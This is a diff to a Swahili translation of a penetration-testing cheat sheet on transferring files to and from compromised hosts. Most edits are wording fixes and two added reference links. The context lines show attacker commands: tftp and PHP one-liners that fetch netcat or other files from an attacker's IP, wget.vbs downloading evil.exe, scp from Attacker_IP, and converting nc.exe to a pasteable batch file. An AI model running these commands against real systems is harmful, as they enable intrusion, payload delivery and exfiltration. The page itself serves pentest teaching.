@@ -45,7 +45,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Pakia faili
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer printing GET and POSTs (pia vichwa)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Moduli ya Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -181,7 +181,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Ikiwa mwathirika ana SSH, mshambuliaji anaweza kuunganisha saraka kutoka kwa mwathirika hadi kwa mshambuliaji.
+Ikiwa mwathirika ana SSH, mshambuliaji anaweza kuunganisha directory kutoka kwa mwathirika hadi kwa mshambuliaji.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -228,7 +228,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP kupokea data hiyo kwa python:
+Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP kupokea data hiyo kwa kutumia python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -248,13 +248,13 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Katika **mhasiriwa**, ungana na seva ya Kali:
+Katika **muhanga**, ungana na seva ya Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Pakua faili yenye PHP oneliner:
+Pakua faili na PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -296,14 +296,18 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Programu ya `debug.exe` si tu inaruhusu ukaguzi wa binaries bali pia ina **uwezo wa kuzijenga tena kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuunda faili la binary. Hata hivyo, ni muhimu kutambua kwamba debug.exe ina **kikomo cha kuunda faili hadi ukubwa wa 64 kb**.
+Programu ya `debug.exe` si tu inaruhusu ukaguzi wa binaries bali pia ina **uwezo wa kuzijenga tena kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuunda faili la binary. Hata hivyo, ni muhimu kutambua kwamba debug.exe ina **kikomo cha kuunganisha faili hadi ukubwa wa 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Kisha nakili-na-kupaste maandiko hayo kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
+Kisha nakala-na-kupasta maandiko hayo kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
+
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
